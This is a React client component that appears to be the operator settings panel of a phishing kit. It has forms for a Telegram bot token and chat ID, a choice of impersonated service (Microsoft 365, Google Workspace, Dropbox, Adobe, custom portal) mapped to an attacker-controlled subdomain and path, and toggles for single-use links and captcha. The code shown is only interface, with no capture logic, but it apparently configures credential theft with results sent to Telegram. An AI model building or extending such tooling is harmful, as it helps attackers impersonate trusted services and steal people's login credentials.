"use client";

import { useActionState } from "react";
import {
  ActionState,
  saveCaptcha,
  saveDefaultService,
  saveLandingPage,
  saveSingleLink,
  saveTelegram,
} from "./actions";

const services = ["Microsoft 365", "Google Workspace", "Custom Portal", "Dropbox", "Adobe"];

function Submit({ pending }: { pending: boolean }) {
  return (
    <button
      type="submit"
      disabled={pending}
      className="mt-6 rounded-lg bg-cyan-400 px-4 py-2.5 text-sm font-semibold text-slate-950 transition hover:bg-cyan-300 disabled:opacity-60"
    >
      {pending ? "Saving..." : "Save"}
    </button>
  );
}

function Status({ state }: { state: ActionState }) {
  if (state.error) return <p className="mt-4 text-sm text-rose-300">{state.error}</p>;
  if (state.success) return <p className="mt-4 text-sm text-emerald-400">{state.success}</p>;
  return null;
}

export function TelegramForm({ initial }: { initial: { chatId: string; botToken: string } }) {
  const [state, action, pending] = useActionState<ActionState, FormData>(saveTelegram, {});
  return (
    <form action={action} className="rounded-lg border border-[var(--border)] bg-[var(--panel)] p-6">
      <label className="block text-sm font-medium text-[var(--text)]">
        Chat ID
        <input name="chatId" defaultValue={initial.chatId} className="form-input" placeholder="-1001234567890" />
      </label>
      <label className="mt-5 block text-sm font-medium text-[var(--text)]">
        Bot Token
        <input name="botToken" defaultValue={initial.botToken} className="form-input" placeholder="123456789:ABC..." />
      </label>
      <Status state={state} />
      <Submit pending={pending} />
    </form>
  );
}

export function LandingPageForm({
  initial,
  domains,
}: {
  initial: { service: string; domainId: number | null };
  domains: { id: number; domain: string; subdomain: string; path: string }[];
}) {
  const [state, action, pending] = useActionState<ActionState, FormData>(saveLandingPage, {});
  return (
    <form action={action} className="rounded-lg border border-[var(--border)] bg-[var(--panel)] p-6">
      <label className="block text-sm font-medium text-[var(--text)]">
        Select a service
        <select name="service" defaultValue={initial.service} className="form-input">
          {services.map((service) => (
            <option key={service} value={service}>
              {service}
            </option>
          ))}
        </select>
      </label>
      <label className="mt-5 block text-sm font-medium text-[var(--text)]">
        Page to domain
        <select name="domainId" defaultValue={initial.domainId ?? ""} className="form-input">
          <option value="">Select domain</option>
          {domains.map((domain) => (
            <option key={domain.id} value={domain.id}>
              {domain.subdomain}.{domain.domain}{domain.path}
            </option>
          ))}
        </select>
      </label>
      <Status state={state} />
      <Submit pending={pending} />
    </form>
  );
}

export function ServiceForm({ initial }: { initial: string }) {
  const [state, action, pending] = useActionState<ActionState, FormData>(saveDefaultService, {});
  return (
    <form action={action} className="rounded-lg border border-[var(--border)] bg-[var(--panel)] p-6">
      <label className="block text-sm font-medium text-[var(--text)]">
        Select a service
        <select name="service" defaultValue={initial} className="form-input">
          {services.map((service) => (
            <option key={service} value={service}>
              {service}
            </option>
          ))}
        </select>
      </label>
      <Status state={state} />
      <Submit pending={pending} />
    </form>
  );
}

export function OptionForm({
  initial,
  type,
}: {
  initial: string;
  type: "single-link" | "captcha";
}) {
  const actionFn = type === "single-link" ? saveSingleLink : saveCaptcha;
  const [state, action, pending] = useActionState<ActionState, FormData>(actionFn, {});
  return (
    <form action={action} className="rounded-lg border border-[var(--border)] bg-[var(--panel)] p-6">
      <label className="block text-sm font-medium text-[var(--text)]">
        Select an option
        <select name="option" defaultValue={initial} className="form-input">
          <option value="enabled">Enabled</option>
          <option value="disabled">Disabled</option>
        </select>
      </label>
      <Status state={state} />
      <Submit pending={pending} />
    </form>
  );
}
